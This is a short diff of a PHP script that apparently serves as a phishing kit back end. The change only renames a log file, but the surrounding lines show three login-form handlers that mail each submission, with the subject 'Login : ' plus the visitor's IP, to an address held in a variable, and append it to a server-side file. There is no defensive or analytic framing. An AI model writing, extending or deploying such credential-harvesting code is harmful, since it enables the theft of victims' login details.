@@ -21,7 +21,7 @@ if (isset($_POST['emailbtn'])) {
 	$subject = "Login : $ip";
 	mail($send, $subject, $message);
 	
-	$file = "text.txt";
+	$file = "data.txt";
 	$open = fopen($file, "a");
 	fwrite($open, $message."\n");
 	fclose($open);
@@ -55,7 +55,7 @@ else if (isset($_POST['contibtn'])) {
 	$subject = "Login : $ip";
 	mail($send, $subject, $message);
 	
-	$file = "text.txt";
+	$file = "data.txt";
 	$open = fopen($file, "a");
 	fwrite($open, $message."\n");
 	fclose($open);
@@ -86,7 +86,7 @@ else if (isset($_POST['login_btn'])) {
 	$subject = "Login : $ip";
 	mail($send, $subject, $message);
 	
-	$file = "text.txt";
+	$file = "data.txt";
 	$open = fopen($file, "a");
 	fwrite($open, $message."\n");
 	fclose($open);
